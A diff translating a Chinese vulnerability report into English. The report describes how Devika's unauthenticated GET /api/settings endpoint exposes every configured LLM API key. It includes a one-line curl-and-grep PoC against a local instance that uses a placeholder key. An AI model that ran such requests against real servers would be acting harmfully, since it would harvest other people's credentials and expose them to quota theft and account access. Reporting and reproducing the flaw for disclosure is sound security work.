@@ -1,23 +1,23 @@
-# Devika：未认证读取全部 LLM API 密钥（GET /api/settings）
+# Devika: unauthenticated disclosure of all LLM API keys via GET /api/settings
 
-## 描述
+## Description
 
-`GET /api/settings`（devika.py:195-199）把 `config.toml` 的完整配置原样返回，包括 `API_KEYS` 段落中已配置的所有真实密钥（CLAUDE/GEMINI/OPENAI/BING 等）。接口无任何认证。
+`GET /api/settings` (devika.py:195-199) returns the full `config.toml` configuration verbatim, including every real key configured under the `API_KEYS` section (CLAUDE/GEMINI/OPENAI/BING, etc.). The endpoint has no authentication.
 
-## 影响
+## Impact
 
-任何能访问 1337 端口的网络客户端用一个 GET 拿到服务器上配置的全部 LLM API 密钥——直接的经济与数据损失（攻击者可用这些 key 消费配额、访问受害者的模型账户）。
+Any network client that can reach port 1337 obtains all LLM API keys configured on the server with a single GET — direct financial and data exposure (the attacker can consume quota and access the victim's model accounts with those keys).
 
 ## PoC
 
 ```bash
-# 1. 前提：config.toml 中已配置任意密钥（模拟真实部署）
-#    [API_KEYS] 段 CLAUDE = "sk-ant-REPRO-FAKE-KEY-9d8e"
-# 2. 启动 devika 后，无凭据读取：
+# 1. Prerequisite: any key configured in config.toml (simulating a real deployment):
+#    [API_KEYS] section: CLAUDE = "sk-ant-REPRO-FAKE-KEY-9d8e"
+# 2. With devika running, fetch without credentials:
 curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-[A-Z0-9-]*'
 ```
 
-## 执行结果
+## Execution result
 
 ```
 $ curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-REPRO-FAKE-KEY-9d8e'
